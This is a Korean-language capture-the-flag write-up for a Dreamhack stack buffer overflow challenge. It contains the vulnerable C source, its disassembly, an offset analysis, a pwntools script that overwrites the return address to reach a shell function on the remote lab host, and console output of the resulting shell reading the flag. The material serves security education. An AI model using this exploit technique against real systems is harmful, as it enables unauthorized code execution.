# Write-up 01 | Pwnable

## 개요

- 분야: Pwnable
- 주제: Stack Buffer Overflow
- 환경: Linux

## 분석

----------------------------------------------------------------------------------------
## Return Address Overwrite의 C코드

```c
#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};

  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```

----------------------------------------------------------------------------------------
## 어셈블리

```asm
0x00000000004006e8 <+0>:  push   rbp
0x00000000004006e9 <+1>:  mov    rbp, rsp
0x00000000004006ec <+4>:  sub    rsp, 0x30
0x00000000004006f0 <+8>:  mov    eax, 0x0
0x00000000004006f5 <+13>: call   0x400667
0x00000000004006fa <+18>: lea    rdi, [rip+0xbb]
0x0000000000400701 <+25>: mov    eax, 0x0
0x0000000000400706 <+30>: call   0x400540 <printf@plt>
0x000000000040070b <+35>: lea    rax, [rbp-0x30]
0x000000000040070f <+39>: mov    rsi, rax
0x0000000000400712 <+42>: lea    rdi, [rip+0xab]
0x0000000000400719 <+49>: mov    eax, 0x0
0x000000000040071e <+54>: call   0x400570 <__isoc99_scanf@plt>
0x0000000000400723 <+59>: mov    eax, 0x0
0x0000000000400728 <+64>: leave
0x0000000000400729 <+65>: ret
```
  
  어셈블리에서 <+4>영역을 보면 sub  rsp, 0x30. 크기가 0x30인것을 알수있다. C언어를 보면 buf = 0x28이므로
  buf(0x28) | 여유공간(0x08) | rbp | ret 으로 이루어져있다는것을 알수 있다.
  또한 gdb의 명령어인 info address로 get_shell의 명령어가 0x4006aa인것을 알수있다.

----------------------------------------------------------------------------------------
## Exploit

```Py
from pwn import *

r = remote("host3.dreamhack.games", 21153)

payload = b"A"*0x30
payload += b"B"*0x8
payload += p64(0x4006aa)

r.recvuntil('Input: ')

r.sendline(payload)
r.interactive()
```

pwntools로 페이로드를 Input: 에 보내보았다
----------------------------------------------------------------------------------------
## 결과

```console
jjang@wjw:/mnt/c/Users/jjang/Downloads/08861c22-4c49-4a28-988f-297575aa6837$ python3 solve.py
[+] Opening connection to host3.dreamhack.games on port 9633: Done
/mnt/c/Users/jjang/Downloads/08861c22-4c49-4a28-988f-297575aa6837/solve.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('Input: ')
[*] Switching to interactive mode
$ ls
flag
rao
run.sh
$ cat flag
DH{□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□}
$
```
----------------------------------------------------------------------------------------
